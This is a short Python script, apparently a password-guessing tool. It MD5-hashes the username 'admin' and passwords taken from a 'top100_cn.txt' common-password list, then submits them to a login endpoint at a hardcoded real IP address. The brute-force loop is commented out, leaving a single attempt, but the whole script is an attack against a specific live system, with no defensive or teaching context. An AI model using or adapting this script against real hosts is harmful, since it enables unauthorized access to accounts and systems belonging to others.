import hashlib

def md5_convert(string):
    m=hashlib.md5()
    m.update(string.encode())
    return m.hexdigest()


import requests

def test_a_pswd(password):
    URL="http://166.111.112.42:8080/om/app/csp/qhdx/dologin"
    # URL = "http://maps.googleapis.com/maps/api/geocode/json"
    # location = "delhi technological university"
    
    PARAMS = {
        "j_username":md5_convert("admin"),
        "j_password":md5_convert(password)
    }
    # PARAMS = {'address':location}
    r=requests.get(url=URL,params=PARAMS)
    
    data=r.json()
    return data

if __name__=="__main__":
    with open("top100_cn.txt","r")as f:
        datas=f.readlines()
        # for pswd in datas:
        print(test_a_pswd(datas[0]))